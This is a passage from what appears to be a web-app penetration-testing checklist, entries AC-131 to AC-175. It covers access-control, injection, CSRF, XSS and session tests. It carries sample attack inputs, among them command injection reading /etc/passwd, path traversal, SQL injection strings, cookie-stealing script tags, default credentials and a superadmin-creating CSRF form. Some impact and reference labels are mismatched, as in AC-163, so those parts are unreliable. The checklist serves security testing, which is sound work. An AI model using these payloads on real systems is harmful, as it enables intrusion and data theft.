**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-131 — Invitation Organization Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Invitation for org A 2. Use to join org B 3. Bypass organization boundary 4. Unauthorized access

**Expected Result:** Invitations should be org-specific

**Payload Example:**

```
Accept invite for wrong organization
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-132 — Invitation Resend Abuse
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Invitation System

**Test Steps:** 1. Request invitation resend 2. Resend to different email 3. Redirect invitation 4. Hijack invite

**Expected Result:** Resend should use original email

**Payload Example:**

```
POST /api/invitations/123/resend {"email":"attacker@evil.com"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-133 — Group IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Access own group 2. Modify group_id 3. Access private group 4. View restricted content

**Expected Result:** Group access should verify membership

**Payload Example:**

```
GET /api/groups/private_group_id/content
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-134 — Group IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Modify own group 2. Change group_id 3. Modify victim's group 4. Change their settings

**Expected Result:** Group modification should verify admin role

**Payload Example:**

```
PUT /api/groups/victim_group {"name":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-135 — Group Membership IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Add self to own group 2. Modify group_id 3. Add self to private group 4. Bypass membership approval

**Expected Result:** Joining should require approval

**Payload Example:**

```
POST /api/groups/private_group/members {"user_id":"attacker"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-136 — Group Admin Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Join group as member 2. Modify role 3. Become group admin 4. Control group

**Expected Result:** Admin promotion should require existing admin

**Payload Example:**

```
PUT /api/groups/123/members/self {"role":"admin"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-137 — Group Deletion IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Delete own group 2. Modify group_id 3. Delete victim's group 4. Destroy their community

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/groups/victim_group_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-138 — Private Group Content Exposure
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Group marked private 2. Access via direct URL 3. View private content 4. Privacy bypass

**Expected Result:** Privacy should be enforced

**Payload Example:**

```
GET /api/groups/private/posts/123
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-139 — Group Member List Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Access group member list 2. View without membership 3. Enumerate members 4. Privacy violation

**Expected Result:** Member lists should verify access

**Payload Example:**

```
GET /api/groups/private/members
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-140 — Group Invitation IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Invite to own group 2. Modify group_id 3. Invite using victim group's quota 4. Abuse their resources

**Expected Result:** Invitations should verify group ownership

**Payload Example:**

```
POST /api/groups/victim_group/invite {"email":"spam@test.com"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-141 — Group Settings CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Create malicious page 2. Admin visits 3. Group settings changed 4. Security weakened

**Expected Result:** Settings should require CSRF token

**Payload Example:**

```
<form action="/groups/123/settings" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AC-142 — Group Search Information Leak
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Search groups 2. Find private groups 3. Enumerate private group existence 4. Map organization structure

**Expected Result:** Private groups should not appear in search

**Payload Example:**

```
Search revealing private group names
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-143 — Cross-Group Data Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Access data in group A 2. Query for group B data 3. Cross-group access 4. Data breach

**Expected Result:** Group boundaries should be enforced

**Payload Example:**

```
Query returning data across groups
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-144 — Group Nested Permission Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** User Groups

**Test Steps:** 1. Nested group structure 2. Access parent via child 3. Bypass permission inheritance 4. Escalate access

**Expected Result:** Nested permissions should be enforced

**Payload Example:**

```
Child group accessing parent-only resources
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-145 — Admin Panel URL Discovery
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Enumerate common admin paths 2. Find admin panel 3. Attempt access 4. Identify attack surface

**Expected Result:** Admin panel should have non-obvious URL

**Payload Example:**

```
/admin /administrator /manage /backend /wp-admin
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-146 — Admin Panel Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Access admin panel 2. Test authentication bypass 3. Access without credentials 4. Full admin access

**Expected Result:** Admin should require strong authentication

**Payload Example:**

```
SQL injection or default credentials in login
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / SQLMap / Hydra

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-147 — Admin Panel Default Credentials
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Find admin login 2. Test default credentials 3. Login with defaults 4. Admin access

**Expected Result:** Default credentials should be changed

**Payload Example:**

```
admin:admin or admin:password or root:root
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Credential Lists

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-148 — Admin Panel Brute Force
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Identify admin login 2. Brute force credentials 3. Gain access 4. Admin compromise

**Expected Result:** Rate limiting should prevent brute force

**Payload Example:**

```
Password wordlist attack
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Hydra / Medusa

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-149 — Admin Panel IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Access as admin 2. Access another admin's data 3. View restricted admin info 4. Admin enumeration

**Expected Result:** Admin IDOR should be prevented

**Payload Example:**

```
GET /admin/users/other_admin_id/settings
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-150 — Admin Panel Privilege Escalation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Login as low-level staff 2. Access super-admin functions 3. Escalate privileges 4. Full control

**Expected Result:** Admin levels should be enforced

**Payload Example:**

```
Access /admin/superadmin as regular admin
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-151 — Admin Panel Function CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Create malicious page 2. Trigger admin function 3. Action executed 4. System compromised

**Expected Result:** Admin actions should have CSRF protection

**Payload Example:**

```
<form action="/admin/users/create"><input name="role" value="superadmin"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## AC-152 — Admin Panel XSS via User Data
**Test Category:** Cross-Site Scripting · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Submit XSS in user field 2. Admin views in panel 3. XSS executes in admin context 4. Admin session stolen

**Expected Result:** Admin views should sanitize user data

**Payload Example:**

```
<script>stealAdminCookie()</script> in username
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## AC-153 — Admin Panel SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Admin search/filter function 2. Inject SQL payload 3. Extract database 4. Data breach

**Expected Result:** Admin queries should be parameterized

**Payload Example:**

```
search='; SELECT * FROM users WHERE '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AC-154 — Admin Panel Command Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Find admin system function 2. Inject OS command 3. Execute on server 4. Full compromise

**Expected Result:** Commands should never use user input

**Payload Example:**

```
filename=test; cat /etc/passwd
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## AC-155 — Admin Panel Path Traversal
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Admin file function 2. Traverse path 3. Access system files 4. Sensitive data exposure

**Expected Result:** Paths should be validated

**Payload Example:**

```
/admin/files?path=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## AC-156 — Admin Panel Session Fixation
**Test Category:** Session Management · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Get session before auth 2. Admin authenticates 3. Hijack session 4. Admin access

**Expected Result:** Session should regenerate on login

**Payload Example:**

```
Fixed session ID for admin
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## AC-157 — Admin Panel Clickjacking
**Test Category:** UI Redressing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Frame admin panel 2. Overlay malicious UI 3. Trick admin 4. Unwanted action

**Expected Result:** Admin should have X-Frame-Options: DENY

**Payload Example:**

```
Invisible iframe over admin actions
```

**Impact:** Clickjacking of a sensitive action -&gt; UI-redress-driven state change.

**Tools:** Burp Suite Clickbandit / Custom HTML

**References:** CWE-1021; -&gt;[CSRF checklist](#/checklist/csrf); OWASP Clickjacking; PortSwigger

---

## AC-158 — Admin Panel Mass Assignment
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Edit admin settings 2. Add extra parameters 3. Modify restricted settings 4. Escalate system access

**Expected Result:** Only allowed params should be accepted

**Payload Example:**

```
{"name":"test",is_superadmin:true,can_delete_all:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## AC-159 — Admin Panel Debug Mode Exposure
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Access debug endpoints 2. View debug information 3. Extract secrets 4. Compromise system

**Expected Result:** Debug should be disabled in production

**Payload Example:**

```
/admin/debug or debug=true parameter
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-160 — Admin Panel Backup Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Admin Panel Access

**Test Steps:** 1. Enumerate backup files 2. Download admin backups 3. Extract credentials 4. Full access

**Expected Result:** Backups should not be accessible

**Payload Example:**

```
/admin/backup.zip or /admin.sql
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-161 — Audit Log IDOR
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. View own audit logs 2. Modify user_id 3. View others' audit logs 4. Privacy violation

**Expected Result:** Log access should verify ownership

**Payload Example:**

```
GET /api/users/victim_id/audit-logs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-162 — Audit Log Tampering
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Perform action 2. Modify audit log entry 3. Hide malicious activity 4. Evidence destruction

**Expected Result:** Audit logs should be immutable

**Payload Example:**

```
DELETE /api/audit-logs/incriminating_entry
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-163 — Audit Log Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Perform action with injection 2. Payload logged 3. Log viewer XSS 4. Admin compromise

**Expected Result:** Logs should sanitize for display

**Payload Example:**

```
Username: <script>stealCookies()</script>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AC-164 — Audit Log Forging
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Access log creation API 2. Create fake log entries 3. Frame other users 4. False evidence

**Expected Result:** Log creation should be system-only

**Payload Example:**

```
POST /api/audit-logs {"user":"victim",action:"deleted_database"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-165 — Audit Log Sensitive Data Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Trigger log creation 2. View audit logs 3. Sensitive data in logs 4. Information disclosure

**Expected Result:** Logs should not contain sensitive data

**Payload Example:**

```
Passwords or tokens in audit entries
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Log Analysis

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## AC-166 — Audit Log Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Enumerate log entries 2. Extract activity patterns 3. Map user behavior 4. Privacy violation

**Expected Result:** Log enumeration should be restricted

**Payload Example:**

```
GET /api/audit-logs?id=1 through ?id=10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## AC-167 — Audit Log Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Identify logged actions 2. Perform via alternate method 3. Bypass logging 4. Untracked activity

**Expected Result:** All sensitive actions should be logged

**Payload Example:**

```
Perform action via API bypassing UI logging
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-168 — Audit Log Denial of Service
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Perform many actions 2. Flood audit logs 3. Exhaust storage 4. Logging failure

**Expected Result:** Log storage should be managed

**Payload Example:**

```
100000 actions per minute
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## AC-169 — Audit Log Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Export own audit logs 2. Modify scope parameter 3. Export all logs 4. Mass data breach

**Expected Result:** Export should verify scope

**Payload Example:**

```
GET /api/audit-logs/export?scope=all
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-170 — Audit Log Search Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Search audit logs 2. Inject SQL/NoSQL 3. Extract data 4. Bypass log security

**Expected Result:** Log search should be parameterized

**Payload Example:**

```
search='; SELECT * FROM audit_logs--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## AC-171 — Audit Log Timestamp Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Action logged with timestamp 2. Modify timestamp 3. Create false timeline 4. Misleading audit trail

**Expected Result:** Timestamps should be server-generated

**Payload Example:**

```
{"action":"delete",timestamp:"2020-01-01T00:00:00Z"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## AC-172 — Audit Log Access Control Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Audit Logging

**Test Steps:** 1. Non-admin user 2. Access admin audit logs 3. View sensitive operations 4. Information disclosure

**Expected Result:** Log access should check permissions

**Payload Example:**

```
Non-admin accessing admin action logs
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## AC-173 — Session Token Prediction
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Analyze session tokens 2. Identify pattern 3. Predict valid tokens 4. Hijack sessions

**Expected Result:** Tokens should be cryptographically random

**Payload Example:**

```
Sequential or timestamp-based session IDs
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## AC-174 — Session Fixation
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

**Test Steps:** 1. Obtain session before auth 2. Victim authenticates 3. Use fixed session 4. Access victim account

**Expected Result:** Session should regenerate on login

**Payload Example:**

```
Fixate session_id before authentication
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## AC-175 — Session Hijacking via XSS
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Session Management

